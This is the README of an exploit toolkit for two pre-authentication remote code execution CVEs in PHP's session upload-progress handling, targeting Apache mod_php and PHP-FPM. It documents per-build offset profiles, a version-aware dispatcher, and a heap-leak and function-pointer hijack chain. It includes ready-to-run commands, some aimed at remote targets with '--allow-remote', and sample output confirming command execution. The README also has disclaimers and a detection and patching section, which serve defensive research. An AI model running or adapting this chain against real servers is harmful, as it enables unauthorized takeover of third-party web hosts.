# PHP2Shell

**Pre-auth RCE research toolkit for CVE-2026-109618 / CVE-2026-109619**

`exploit by devploit`

![A verified PHP2Shell run against the PHP 8.5.11 laboratory](docs/images/php2shell-run.webp)

*Verified run against the local PHP 8.5.11 laboratory: `uid=33(www-data)`.*

> **Authorized testing only.** Use this material exclusively against systems you
> own or have explicit, written permission to test. It is not a scanning tool,
> it ships no target list, and it must not be used against third-party
> infrastructure. The chain is disruptive: it sends large request bodies,
> triggers pre-RINIT out-of-memory conditions and kills Apache children.

PHP2Shell is a research workspace for the `session.upload_progress` OOM /
stale-pointer chain in PHP's Apache module, plus the PHP-FPM variant that
exploits the same CVEs through the stale `BG(unserialize)` state. It packages a
version-aware dispatcher, a per-build profile engine, reproducible laboratories,
a calibration factory and runtime instrumentation around the public research
exploit by [9bie](https://github.com/9bie/php2shell-bypass-aslr-exp).

The goal is reproducible research and defensive validation, not mass
exploitation. The dispatcher refuses to guess: it stops when the build has no
verified profile, when the target is a fixed release, or when the target OS does
not match the profile.

---

## Status

| Build | Image | Profile | Heap leak | libphp leak | RCE | Notes |
| --- | --- | --- | --- | --- | --- | --- |
| PHP 8.5.11 aarch64 | `php:8.5.11-apache` | `php-8.5.11-bookworm-aarch64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.5.11 amd64 | `php:8.5.11-apache` | `php-8.5.11-bookworm-amd64` | yes | yes | **yes** | separate offsets, same `htdata` |
| PHP 8.5.10 aarch64 | `php:8.5.10-apache` | `php-8.5.10-bookworm-aarch64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.5.10 amd64 | `php:8.5.10-apache` | `php-8.5.10-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.5.5 amd64 | `php:8.5.5-apache` | `php-8.5.5-bookworm-amd64` | yes | yes | **yes** | vessel stage 3; `uid=33(www-data)` |
| PHP 8.5.0 amd64 | `php:8.5.0-apache` | `php-8.5.0-bookworm-amd64` | yes | yes | **yes** | vessel stage 3; `uid=33(www-data)` |
| PHP 8.5.1 – 8.5.9 amd64 | `php:8.5.{1..9}-apache` | `php-8.5.<v>-bookworm-amd64` | yes | yes | **yes** | vessel stage 3; `uid=33(www-data)` |
| PHP 8.4.26 amd64 | `php:8.4.26-apache` | `php-8.4.26-bookworm-amd64` | yes | yes | **yes** | reference build |
| PHP 8.4.26 deb13/apxs2 amd64 | source build (Debian 13, Apache 2.4.69 apxs2) | `php-8.4.26-deb13-apxs2-amd64` | yes | yes | **yes** | third stage-3 layout; instance-dependent; requires `--profile deb13-apxs2` |
| PHP 8.4.26 FPM amd64 | php-8.4.26 source tarball (nginx+FPM) | `php-8.4.26-fpm` | http (stale string) | http (stale string) | **yes** | `BG(unserialize)` chain; two-slot reclaim; HTTP-only `no-oracle` endgame |
| PHP 8.4.25 FPM amd64 | php-8.4.25 source tarball (nginx+FPM) | `php-8.4.25-fpm` | http (stale string) | http (stale string) | **yes** | same chain, calibrated geometry |
| PHP 8.4.0 FPM amd64 | php-8.4.0 source tarball (nginx+FPM) | `php-8.4.0-fpm` | http (stale string) | http (stale string) | **yes** | earliest 8.4 release of the branch |
| PHP 8.3.35 FPM amd64 | php-8.3.35 source tarball (nginx+FPM) | `php-8.3.35-fpm` | http (stale string) | http (stale string) | **yes** | last vulnerable 8.3 |
| PHP 8.2.34 FPM amd64 | php-8.2.34 source tarball (nginx+FPM) | `php-8.2.34-fpm` | http (stale string) | http (stale string) | **yes** | last vulnerable 8.2 |
| PHP 8.1.33 FPM amd64 | php-8.1.33 source tarball (nginx+FPM) | `php-8.1.33-fpm` | http (stale string) | http (stale string) | **yes** | same chain; the stale struct is reclaimed from 7.4 on |
| PHP 8.0.30 FPM amd64 | php-8.0.30 source tarball (nginx+FPM) | `php-8.0.30-fpm` | http (stale string) | http (stale string) | **yes** | same chain |
| PHP 7.4.33 FPM amd64 | php-7.4.33 source tarball (nginx+FPM) | `php-7.4.33-fpm` | http (stale string) | http (stale string) | **yes** | same chain; `poison` also works |
| PHP 7.2.34 FPM amd64 | php-7.2.34 source tarball (nginx+FPM) | — (plant only) | no | no | no | arms the stale state; reclaim shape not found; `poison` plant, no RCE profile |
| PHP 8.4.25 aarch64 | `php:8.4.25-apache` | `php-8.4.25-bookworm-aarch64` | yes | yes | **yes** | probabilistic stage 3; retries |
| PHP 8.4.25 amd64 | `php:8.4.25-apache` | `php-8.4.25-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.20 amd64 | `php:8.4.20-apache` | `php-8.4.20-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.19 amd64 | `php:8.4.19-apache` | `php-8.4.19-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.11 amd64 | `php:8.4.11-apache` | `php-8.4.11-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.10 amd64 | `php:8.4.10-apache` | `php-8.4.10-bookworm-amd64` | yes | yes | **yes** | `uid=33(www-data)` |
| PHP 8.4.13, 8.4.8 amd64 | `php:8.4.{8,13}-apache` | `php-8.4.<v>-bookworm-amd64` | yes | yes | no | stage-3 sweep attempts exhausted |
| PHP 8.4.14 – 8.4.18, 8.4.12, 8.4.7, 8.4.6 amd64 | `php:8.4.<v>-apache` | `php-8.4.<v>-bookworm-amd64` | yes | pending | no | stage-2 leak needs re-run (cookie decode fix) |
| PHP 8.5.0 aarch64 | `php:8.5.0-apache` | `php-8.5.0-bookworm` | yes | yes | no | lab build; stage-3 layout not found |
| PHP 8.3.35 amd64 | `php:8.3.35-apache` | `php-8.3.35-bookworm-amd64` | yes | yes | no | stage-3 reference alive; vessel geometry does not fit this heap |
| PHP 8.3.35 aarch64 | `php:8.3.35-apache` | `php-8.3.35-bookworm-aarch64` | yes | yes | no | stage-3 reference alive |
| PHP 8.3.33 mod_php | `wordpress:7.1.1-apache` | `php-8.3.33-wordpress-mod_php` | yes | yes | no | stage-3 reference alive |
| PHP 8.4.5 amd64 | `php:8.4.5-apache` | `php-8.4.5-bookworm-amd64` | yes | no | no | stale block at v0892; no libphp pointer |
| PHP 8.3.20 amd64 | `php:8.3.20-apache` | `php-8.3.20-bookworm-amd64` | yes | no | no | stale block at v0892; no libphp pointer |
| PHP 8.4.2 amd64 | `php:8.4.2-apache` | `php-8.4.2-bookworm-amd64` | no | no | no | UAF; leak shape differs |
| PHP 8.3.0 aarch64 | `php:8.3.0-apache` | `php-8.3.0-bookworm` | no | no | no | `PS(id)` dangling; cookie not reclaimed |
| PHP 8.2.34 amd64 | `php:8.2.34-apache` | `php-8.2.34-bookworm-amd64` | no | no | no | UAF; leak shape differs |
| PHP 8.2.34 aarch64 | `php:8.2.34-apache` | `php-8.2.34-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 8.2.28 amd64 | `php:8.2.28-apache` | `php-8.2.28-bookworm-amd64` | no | no | no | UAF; leak shape differs |
| PHP 8.1.34 amd64 | `php:8.1-apache` (bullseye) | `php-8.1.34-bullseye-amd64` | no | no | no | UAF; leak shape differs; EOL branch |
| PHP 8.1.34 aarch64 | `php:8.1-apache` | `php-8.1.34-bookworm-aarch64` | no | no | no | UAF; leak shape differs; EOL branch |
| PHP 8.0.30 aarch64 | `php:8.0-apache` | `php-8.0.30-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 7.4.33 amd64 | `php:7.4-apache` (buster) | `php-7.4.33-buster-amd64` | no | no | no | UAF; leak shape differs; EOL branch |
| PHP 7.4.33 aarch64 | `php:7.4-apache` | `php-7.4.33-bookworm-aarch64` | no | no | no | UAF; leak shape differs |
| PHP 8.2.0 aarch64 | `php:8.2.0-apache` | — (offsets only) | n/a | n/a | no | no heap profile |
| PHP 8.0.30 amd64 | `php:8.0-apache` | — (offsets only) | n/a | n/a | no | no heap profile |

**56 profiles (48 Apache/mod_php + 8 PHP-FPM), 30 with verified RCE. Offsets
extracted for 48 image/arch rows covering 39 official-image Apache builds.**

Independent re-verification on 2026-10-30 reproduced the command proof
(`uid=33(www-data)`) for every RCE profile added by the stage-3 PR: 8.4.10,
8.4.11, 8.4.19, 8.4.20, 8.4.25 amd64 and all of 8.5.0–8.5.10 amd64 plus
8.5.11 aarch64. Those profiles say
`contributor-reported, maintainer-confirmed` in their `status`: the contributor
supplied the calibration and the maintainer reproduced it. The PHP-FPM profiles
are **contributor-reported, not independently confirmed** and
environment-specific (the compile-time prefix shifts the heap); re-run
`calibrate` on the host that will run the exploit. The 8.4.26 deb13/apxs2
source build is likewise **contributor-reported, not independently confirmed**.
The four Apache profiles that already existed on `main` before the stage-3 PR
were verified earlier and were not re-run during this review.

`Heap leak` is stage 1, `libphp leak` is stage 2 and `RCE` is a real command
proof on an isolated lab. `no` means not verified, not necessarily impossible;
`pending` means the sweep predates the cookie `'+'` decoding fix and the leak
stage must be re-run; `n/a` means no heap profile exists for that build. The
8.2.0 and 8.0.30-amd64 rows are offsets-only entries. All `yes` Apache rows use
the lab configuration: Apache prefork `mod_php`, one worker,
`display_errors=On`, `memory_limit=8M` and `session.upload_progress=On`. The
FPM rows use the nginx+FPM lab: `oracle (heap)`/`oracle (PIE)` mean the FPM
chain reads the chunk and php-fpm PIE base from `/proc/<pid>/mem` in local lab
mode; the `no-oracle` path leaks them over HTTP and is fully remote. Per-image
offsets and `libphp` sha256 are in
[the offset inventory](docs/offset-inventory.md). The 8.4.25 (aarch64) profile
needs the default retries because its stage 3 is probabilistic. The 8.5.0 –
8.5.9 rows use the **vessel stage 3** (`tools/php2shell_vessel.py`, documented
in [the profile inventory](docs/profile-inventory.md)): the early-8.5 heap puts
the dangling reference out of the upstream carrier's reach, so request S
steers it one page up onto B2's blob page and a blob embeds the reference
pattern itself. The 8.1/8.2/7.4 and 8.4.2 rows are the real-world "older
subversion" builds: on those the stage-1 UAF shapes the heap differently and
the leak does not reproduce with the 8.4.10+ parameters — an honest negative,
reported as such. The 8.4.26 deb13/apxs2 row is a contributor-reported source
build, not an official image: its stage-3 phase is instance-dependent (the
contributor reported 4/4 runs on one Apache master and 0/5+ on others), so
retry on a fresh master and select it with `--profile deb13-apxs2` because
two 8.4.26 amd64 profiles exist.

## Features

- **Version-aware dispatch** — fingerprints the target, rejects fixed releases,
  selects the exact build profile and passes offsets, `htdata` and heap
  parameters explicitly. `--php-version` covers servers that hide their version;
  `--arch` selects aarch64 or amd64 (auto-detected for local containers,
  required for remote targets), and `--profile` forces an exact build.
- **Configuration probe** — one request reveals the target `memory_limit`,
  `post_max_size` and whether request-startup diagnostics render
  (`display_errors`). The chain then runs once instead of sweeping every
  memory limit, and a `post_max_size` that would silently reject the OOM body
  is reported as `CONFIG BLOCKED` before any exploit attempt.
- **Worker pinning** — keeps N-1 prefork workers busy with idle keep-alive
  connections so the whole chain lands on one process. Automatic for loopback
  laboratories; opt-in for remote infrastructure.
- **Proof handling** — reads the container's `/out` mount for local targets, or
  fetches a web-accessible output path for remote targets. `--fetch` and
  `--no-fetch` override it.
- **Command staging** — on local labs `-c` accepts commands of any length,
  stages them in `/out/c` and captures the output. `--script` and `--interactive`
  provide batch and REPL modes.
- **FPM exploitation chain** — `tools/php2shell_fpm.py` exploits the same
  CVEs against PHP-FPM behind nginx: an out-of-memory request leaves the
  `BG(unserialize)` pointer stale, the next request reclaims the struct, and a
  forged session variable turns the session shutdown path into `zif_system`.
  Verified command execution over HTTP on 7.4.33, 8.0.30, 8.1.33, 8.2.34,
  8.3.35, 8.4.0, 8.4.25 and 8.4.26 (the stale struct is reclaimed from 7.4
  on — `php_session_cancel_decode` only unlinks the session file); `patchcheck`
  proves 8.4.27 is clean. Two arm modes: the single-surface amplified
  `session_decode` for stock installations and the classic two-surface
  builder; `--workers` fans the arm/consume over a default `pm=dynamic` pool;
  `probe` reports which preconditions a target satisfies. `calibrate` derives
  the leak and reclaim geometry of any 7.4+ build over HTTP only;
  `poison` (the `session.upload_progress` session-file plant) covers 5.x and
  7.2; `php2shell_fpm_matrix.py` verifies the whole unpatched set in one run
  and records the verdicts in `docs/calibration-logs/verification.json`. The `no-oracle`
  endgame is fully remote — no `/proc/<pid>/mem`, no local shell.
- **PHP version registry** — `tools/php2shell_fpm_versions.py` is the single
  source of truth for the affected-version matrix: `is_vulnerable()`,
  `fixed_in()`, `source_is_fixed()` classifies a tarball by the presence of the
  upstream fix marker instead of trusting a version string.
- **Calibration factory** — `php2shell_calibrate.py` discovers stages 1-2 and
  verifies stage 3 with a real proof before writing `rce: true`;
  `php2shell_matrix.py` runs the factory over a matrix of images.
- **Laboratories and instrumentation** — disposable labs per build, `/proc`
  memory oracle, gdb recipes and offset extraction for arbitrary images.

## Quick start

Requirements: Python 3.11+, Docker (for the Apache labs), Linux or macOS on
arm64 or amd64. The Apache chain works on both; the PHP-FPM `endgame`/oracle
needs Linux `/proc` (the `no-oracle` path does not), and the FPM build scripts
fall back to `sysctl` when `nproc` is unavailable. Fetch the pinned upstream:

```sh
python3 tools/bootstrap_upstream.py
```

The script clones the public 9bie research into `vendor/php2shell-upstream` and
checks out the pinned commit. The toolkit applies the minimal SNI and
heap-parameter changes in place at runtime; they are documented in
[docs/upstream-changes.md](docs/upstream-changes.md). No patch file is
redistributed.

Start the local laboratories and run the dispatcher against the PHP 8.4.26 lab:

```sh
python3 tools/php2shell_labs.py up
python3 tools/php2shell_auto.py \
  -u http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream
```

Expected shape:

```text
  exploit by devploit  ·  CVE-2026-109618 / CVE-2026-109619
  automatic target detection, build profile dispatch and command execution
  authorized testing only

[*] CHAIN 01/01  automatic target detection / fixed command proof
00:00.00  DISCOVER   http://127.0.0.1:8105/index.php
00:00.01  OK         PHP 8.4.26  ·  Apache/2.4.69 (Debian)
00:00.01  PREFLIGHT  php-8.4.26-bookworm-amd64
00:00.15  PROBE      config probe: 16 MiB body
00:00.16  OK         detected memory_limit=8M
00:00.16  OK         display_errors=On (request-startup diagnostics are rendered)
00:00.17  EXECUTE    memory_limit=8M  ·  huge_mb=12
   │ [+] chunk base = 0x7ffffc400000
   │ [+] libphp base = 0x7ffffe013000
   │ PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)

╭─ RESULT ─────────────────────────────────────────────────────────╮
│ PRE-AUTH RCE CONFIRMED                                           │
╰──────────────────────────────────────────────────────────────────╯
```

Useful entry points:

```sh
python3 tools/php2shell_auto.py --list          # profiles and RCE status
python3 tools/php2shell_auto.py -u <target> --dry-run --no-color
python3 tools/php2shell_auto.py -u <target> --php-version 8.4.26 --arch amd64 --allow-remote
python3 tools/php2shell_labs.py status
python3 tools/php2shell_inventory.py
```

### PHP-FPM laboratory (no Docker)

The FPM chain runs against an amd64 user-prefix PHP build with nginx — no
Docker, no root. Build nginx and a vulnerable PHP (any of 7.4.33, 8.0.30,
8.1.33, 8.2.34, 8.3.35, 8.4.0, 8.4.25 or 8.4.26), then start the lab for
that version:

```sh
lab/fpm/build_nginx.sh
lab/fpm/build_php.sh 8.4.26
python3 tools/php2shell_fpm_labs.py up --only 8.4.26
python3 tools/php2shell_fpm_labs.py status
```

The default `endgame` uses the `/proc/<pid>/mem` oracle (`ptrace_scope=0`);
`no-oracle` is fully remote and leaks chunk/PIE over HTTP by default:

```sh
python3 tools/php2shell_auto.py -u http://127.0.0.1:8110/index.php --sapi fpm \
  --builder http://127.0.0.1:8111
# or drive the chain directly:
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 \
  endgame
# fully remote RCE: HTTP leak, no /proc at exploit time (--chunk/--pie override)
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 \
  --command 'id>out/p1' --proof-file out/p1 no-oracle
# stock installation shape: --builder defaults to --base, one port, one pool,
# memory_limit=128M, pm=dynamic x5 workers, stock php.ini (nginx needs
# client_max_body_size >= 5m for the arm body)
python3 tools/php2shell_fpm.py \
  --base http://target --allow-remote --version 8.4.26 \
  --command 'id>out/p1' --proof-file out/p1 no-oracle
# checklist: does this target meet every precondition of the chain?
python3 tools/php2shell_fpm.py --base http://target --allow-remote --version 8.4.26 probe
# print only the leaked bases
python3 tools/php2shell_fpm.py \
  --base http://127.0.0.1:8110 --builder http://127.0.0.1:8111 --version 8.4.26 leak
# derive a profile for any 7.4+ build over HTTP, then trust it:
python3 tools/php2shell_fpm.py \
  --version 8.2.34 --base http://127.0.0.1:8406 --builder http://127.0.0.1:8407 calibrate
# 5.x and 7.2 (no verified reclaim): plant chosen bytes into a chosen
# session file (pre-auth write, needs an app gadget for code execution)
python3 tools/php2shell_fpm.py \
  --version 7.4.33 --base http://127.0.0.1:8336 --builder http://127.0.0.1:8337 \
  poison --sid plant7x --payload 'PLANTED_MARKER'
# verify the remote chain on every unpatched build in one run
# (7.2 is recorded as SESSION PLANT, 7.4+ as REMOTE RCE)
python3 tools/php2shell_fpm_matrix.py
python3 tools/php2shell_fpm_labs.py down
```

The consumer request exits with HTTP 502 (the worker dies after firing
`zif_system`); the proof is written by the command itself and served statically
from `/out/`. See [docs/fpm-chain.md](docs/fpm-chain.md).

## How it works

The chain abuses the `session.upload_progress` callback that runs **before**
the request startup (pre-RINIT) and therefore before the target script:

1. **Stage 1 — heap leak.** A multipart request drives the parser into an
   out-of-memory bailout after `php_session_track_init()` built the session
   state. The next request reuses the stale `PS(id)` and returns a
   `Set-Cookie` whose value contains heap pointers, revealing the Zend MM chunk
   base.
2. **Stage 2 — libphp leak.** The same stale-state primitive is reshaped to
   disclose a pointer into `libphp.so`, revealing its load base.
3. **Stage 3 — control flow.** A forged HashTable/reference lands on the stale
   session state; the `zval_ptr_dtor` path calls `zif_system` with a short
   command carried in a fake `zend_string`.

The full technical write-up, including the session lifecycle and the heap
grooming, is in [docs/php2shell-analysis.md](docs/php2shell-analysis.md).

### PHP-FPM chain

The FPM lifecycle differs from mod_php: a pre-RINIT OOM kills the worker
outright (`FPM_EXIT_SOFTWARE`), so the Apache stage-1/2/3 carrier does not
transfer. The FPM chain instead abuses the stale `BG(unserialize)` state:

1. **Arm.** An out-of-memory multipart request aborts between
   `php_var_unserialize_init` and `php_var_unserialize_destroy`, leaving
   `BG(unserialize).data` dangling and `level=1`. The next request that reaches
   RINIT memsets `BG` — so the stale window is one request wide.
2. **Locate and reclaim.** The stale 8216-byte `php_unserialize_data` struct is
   found with the `/proc/<pid>/mem` oracle (two candidate heap slots; a mismatch
   self-corrects on retry); `no-oracle` skips the mem read and tries both slots
   directly. A 4 MB body posted to a second endpoint (the builder pool)
   reclaims the chunk.
3. **Forge and fire.** The reclaimed buffer carries a fake `zend_reference`
   whose `val` is a fake array whose `pDestructor` is `zif_system`. The consume
   request attaches it as session variable `r`; at session shutdown
   `zval_ptr_dtor(&PS(http_session_vars))` destroys the reference, the array
   destructor loop calls `zif_system(frame)` with the argument at `execute_data
   + 0x50` — a fake `zend_string` holding the command.

`cmd_patchcheck` verifies the stale arm on 8.4.26 and that 8.4.27 (`level=0`)
is clean. Details in [docs/fpm-chain.md](docs/fpm-chain.md).

A profile is per build:

```json
{
  "libphp": { "zif_system": "0x465370", "zval_ptr_dtor": "0x65eb60", "htdata": "0x690d8" },
  "stages": { "stage1_n": 841, "stage1_forge_len": 79, "stage2_t": 406,
              "stage2_v": 16, "stage3_pads": [[31, 31]], "stage3_carrier": true },
  "oom_mb": 12,
  "rce": true
}
```

## Architecture selection

Some versions ship more than one build. PHP 8.5.11 has separate aarch64 and amd64
offsets:

- local container: the dispatcher reads `uname -m` and selects the matching
  profile automatically;
- remote target: `--arch aarch64|amd64` (or `--profile NAME`) is **required**,
  even when the version has a single profile. HTTP does not expose the CPU
  architecture, so the dispatcher refuses instead of guessing.

The FPM profile (`php-8.4.26-fpm`) is an **amd64** user-prefix build of the
8.4.26 source tarball. It runs only in the local nginx+FPM laboratory, so the
oracle selects the build and there is no remote architecture dispatch.

## Configuration requirements

The shipped calibration targets:

- Apache prefork + `mod_php` with **one worker**;
- `display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`;
- **`post_max_size` ≥ `memory_limit` + 12M** (the labs ship 512M): stage 1
  posts a body of `memory_limit` + 12M, and PHP rejects a body larger than
  `post_max_size` *before* parsing it — no OOM, no leak, no error. The stock
  default `post_max_size=8M` blocks the whole chain on its own;
- `session.upload_progress.enabled=On`, `session.use_cookies=1`,
  `session.use_strict_mode=0`.

A hardened production PHP (128M+, `display_errors=Off`, multiple workers, FPM)
does not match the shipped Apache calibration. Multi-worker Apache targets are
handled with `--pin-workers`; `display_errors=Off` remains an open research
item. The dispatcher reports a blocking `post_max_size` as `CONFIG BLOCKED` and
skips memory-limit candidates whose OOM body the target would reject. The FPM chain runs against two supported shapes — run `probe` against a
target to see which ones its configuration satisfies:

- **Stock installation (single surface, `--arm-mode growth`, auto when
  `--builder` equals `--base`):** one nginx port, one pool,
  `memory_limit=128M`, `pm=dynamic` with any worker count,
  `post_max_size=8M`, `session.upload_progress.cleanup=On`, the `php`
  serializer and `files` storage — the php.ini production defaults. The
  arm is an amplified `session_decode` (a wide nested-array payload whose
  decode multiplies memory ~22x while `BG(unserialize).level == 1`), so no
  big session file and no `memory_limit` split are involved. The front must
  pass ~5 MB bodies: nginx needs `client_max_body_size 5m` (stock `1m` is
  too small to push 128M over; Apache has no such default cap). The
  application must provide four operations: `session_start()`, a stored
  reference (`R:N`), a reflected session value, and either a
  `session_decode()` of attacker data or session accumulation
  (`--grow-path`).
- **Classic builder (two surfaces, `--arm-mode builder`):** a consumer pool
  low enough that decoding the 4 MB arm OOMs after RINIT and a builder
  surface high enough to persist it, sharing a session directory — both
  behind one port with `--builder-prefix` if you want a single origin.

The leak geometry is *per environment* (the freed-string slot depends on the
build's allocator and the checkout paths): run `calibrate` once per host
before trusting `no-oracle` there. The `no-oracle` endgame is fully remote;
only the lab `endgame`/`primitive` modes additionally need
`/proc/<pid>/mem` (`yama ptrace_scope=0`) — see
[docs/fpm-chain.md](docs/fpm-chain.md).

## Multi-worker targets

The stale session state is per worker. Without pinning, stage 1's A/B requests
land on different children and the leak fails:

```sh
--pin-workers 4        # hold 3 workers with keep-alive, leave one free
--pin-workers auto     # loopback default: count workers in the container
--no-pin-workers       # disable pinning
```

For loopback targets the count is detected automatically. For remote targets
pinning is **opt-in**: it opens keep-alive connections until a request stops
being answered, which is intrusive and only appropriate on authorized
infrastructure. `--pin-max N` bounds the connections (default 32).

The PHP-FPM chain does not pin: it **fans out** instead. `--workers N`
(default 5, matching `pm.max_children` of a stock pool) repeats the arm over
the pool and repeats the consume, so every worker is armed and the fire lands
on an armed one without holding connections open. A failed attempt on an
unarmed worker is a no-op request; the armed workers stay standing.

## Commands and proof

A remote `-c` command is limited to 14 bytes (the fake `zend_string` carrier).
On a local lab the dispatcher stages the command in `/out/c`, runs
`sh</out/c` and captures the output:

```sh
-c 'id'                       # short
-c 'id; uname -a; whoami'     # any length on a local lab
--script ./cmd.sh             # batch
--interactive                 # REPL; one full chain per command
```

Local targets read the container's `/out` mount directly. Remote targets use
`id>p1` and fetch `/p1` automatically; `--fetch PATH` overrides and
`--no-fetch` disables the read-back. A remote command that writes outside the
webroot, or a server that does not serve the file, will execute blind: no proof
does not necessarily mean no execution.

## Speed

The dispatcher probes the target `memory_limit` from one request's fatal
message. Measured locally: **7.0 s** for 8M and **13.5 s** for 128M (probe +
one chain), versus several minutes for a blind sweep.

```sh
--memory-limit-mb 128   # skip the probe
--retries 1             # fewer attempts (stage 3 uses retries+2)
--no-pre-rotate         # skip the initial rotation
--no-retry-rotate       # no rotation between failures
--no-probe              # disable the probe
```

## Upstream integration

The chain itself is the public research by 9bie. The upstream repository has no
explicit license, so its source is **not vendored** in this repository. Instead:

- `tools/bootstrap_upstream.py` clones it into `vendor/php2shell-upstream`
  (git-ignored) and pins commit `4586f5c`;
- `tools/php2shell_upstream.py` applies the minimal changes in place at
  runtime: SNI on the HTTPS path and the `P2S_STAGE1_N` / `P2S_FORGE_LEN` /
  `P2S_STAGE2_T` / `P2S_STAGE2_V` overrides;
- [docs/upstream-changes.md](docs/upstream-changes.md) records the same changes
  for manual use, and [docs/licensing.md](docs/licensing.md) explains why no
  patch is redistributed;
- `tools/php2shell_paths.py` resolves the checkout, so `--repo-dir` defaults to
  `vendor/php2shell-upstream` when present and falls back to `/tmp/php2shell-rce`.

If you prefer a git dependency, use a submodule instead of the bootstrap:

```sh
git submodule add https://github.com/9bie/php2shell-bypass-aslr-exp vendor/php2shell-upstream
git -C vendor/php2shell-upstream checkout 4586f5c
# the toolkit applies the documented runtime changes in place
```

## Repository layout

```text
catalog/vulnerable.json        vulnerable branches and fixed releases
.github/workflows/ci.yml       tests, profile validation and gitleaks
.github/workflows/live-fpm.yml manual live FPM lab (build + exploit 8.4.x)
.github/workflows/release.yml  GitHub release on v* tags
profiles/*.json                build profiles (offsets, heap params, verified flag)
profiles/*-fpm.json            verified PHP-FPM profiles (8.2.34 - 8.4.26)
profiles/schema.json           generic build-profile validator
profiles/fpm-schema.json       strict PHP-FPM profile validator
profiles/offsets/*.json        ELF symbol offsets per image
requirements-dev.txt           jsonschema + ruff (dev/CI)
vendor/                        generated upstream checkout (git-ignored)
tools/
  php2shell_auto.py            version-aware dispatcher (Apache + FPM)
  php2shell_fpm.py             PHP-FPM client (calibrate/poison/leak/no-oracle/endgame)
  php2shell_fpm_labs.py        user-prefix FPM laboratories (no Docker)
  php2shell_fpm_matrix.py      verify the remote chain on every unpatched build
  php2shell_fpm_profile.py     draft FPM profile generator (nm + offsets)
  php2shell_fpm_versions.py    affected-version registry (single source of truth)
  php2shell_fpm_offsets.c      struct offsets compiled per build
  php2shell_calibrate.py       Apache profile generator with proof verification
  php2shell_matrix.py          Apache profile factory over image tags
  php2shell_rce.py             manual upstream launcher
  php2shell_assess.py          exposure/leak assessment (no RCE claim)
  php2shell_labs.py            disposable local Apache laboratories
  php2shell_offsets.py         ELF offset extraction for any image
  php2shell_inventory.py       profile/offset table
  php2shell_paths.py           upstream checkout resolution
  php2shell_upstream.py        in-place SNI/heap-parameter changes
  bootstrap_upstream.py        fetch and pin the upstream
  php2shell_ui.py              terminal UI
lab/
  wordpress/                   WordPress 8.3.33 + mod_php laboratory
  rce/                         single-worker calibration lab and configs
  fpm/                         nginx + PHP-FPM laboratory (7.2 - 8.4; build_*.sh)
docs/
  php2shell-analysis.md        technical analysis
  fpm-chain.md                 PHP-FPM chain and laboratory
  rce-guide.md                 full RCE guide and profile schema
  exploit-report.md            laboratory results
  labs.md                      laboratory reference
  safe-lab.md                  harmless OOM laboratory
  profile-inventory.md         profile table
  offset-inventory.md          libphp offsets per build
  inventory-growth.md          coverage roadmap
  branch-notes.md              per-branch findings
  upstream-changes.md          manual record of the runtime changes
  licensing.md                 MIT and upstream licensing notes
  instrumentation/             /proc oracle and gdb recipes
  es/                          Spanish originals
```

## Laboratories and calibration

```sh
python3 tools/php2shell_labs.py up      # 7.4.33 ... 8.5.11 on :8100-:8106
python3 tools/php2shell_labs.py test    # run the dispatcher against each lab
python3 tools/php2shell_labs.py down
```

Every lab binds to `127.0.0.1`, runs one worker with the calibration
`php.ini`/`apache.conf` and mounts an `/out` directory for proof collection.

Generate a profile for a new build:

```sh
python3 tools/php2shell_calibrate.py \
  --target http://127.0.0.1:8105/index.php \
  --container p2s-lab-8426 \
  --repo-dir vendor/php2shell-upstream \
  --proof-file lab/rce/out/8.4.26/p1 \
  --distro bookworm
```

`--distro`, `--arch` and the image tag determine the profile name. Stage 1 and
2 are discovered automatically; stage 3 is attempted with the known layouts and
`rce: true` is written only after a real command proof.

## Instrumentation

`docs/instrumentation/` contains a read-only `/proc/<pid>/mem` oracle
(`mem_dump.php`, `id_dump.php`), the `ps_globals` offsets for every build and
gdb recipes used to inspect the session reference, the fake HashTable and the
OOM path. The native-amd64 recipes cover Apache under gdb with `SYS_PTRACE` and
`zend_mm_heap` offsets.

The oracle is how the branch findings were measured: for example, on 8.3.35 the
session reference is still alive (`refcount=2`, `val.type=IS_ARRAY`) after the
OOM, which is why the 8.4/8.5 stage-3 carrier does not transfer.

## Detection and defense

- **Patch.** CVE-2026-109618 / CVE-2026-109619 are fixed in the releases listed
  in [catalog/vulnerable.json](catalog/vulnerable.json) (8.4.27 and 8.5.12 for
  the 8.4/8.5 branches). Verify against the current PHP advisories.
- **Disable what you do not use.** `session.upload_progress.enabled=Off` removes
  the pre-RINIT callback this chain depends on. If upload progress is required,
  restrict it to endpoints that actually need it.
- **Raise the bar.** `display_errors=Off` blocks the shipped stage-1 leak (an
  alternative path is research, not a shipped feature). A realistic
  `memory_limit` and a read-only webroot make proof collection harder; they are
  not fixes.
- **Reduce worker state reuse.** Keep session state per application and avoid
  sharing session storage across trust boundaries.
- **Detect.** Watch for multipart requests with ~1000 fields, very large bodies,
  repeated OOM/500 responses, Apache child crashes and `zend_mm_heap corrupted`
  log lines. Rate-limit large multipart bodies at the edge.
- **Least privilege.** Run PHP as an unprivileged user with a read-only
  document root and no shell access where possible.

## Limitations

- **mod_php prefork and FPM.** The Apache chain needs prefork + `mod_php`; the
  FPM chain needs nginx + FPM — either the stock single-pool shape (amplifier
  arm, ~5 MB bodies through the front, four application session operations)
  or the classic two surfaces (a low-memory consumer pool and a high-memory
  builder pool sharing a session directory). Only the lab-only
  `endgame`/`primitive` oracle modes need `/proc/<pid>/mem`
  (`ptrace_scope=0`); `no-oracle` is fully remote. Other SAPIs are not
  supported.
- **One worker / pinning.** Without pinning, the per-worker session state breaks
  stage 1 (the Apache chain pins; the FPM chain fans out with `--workers`).
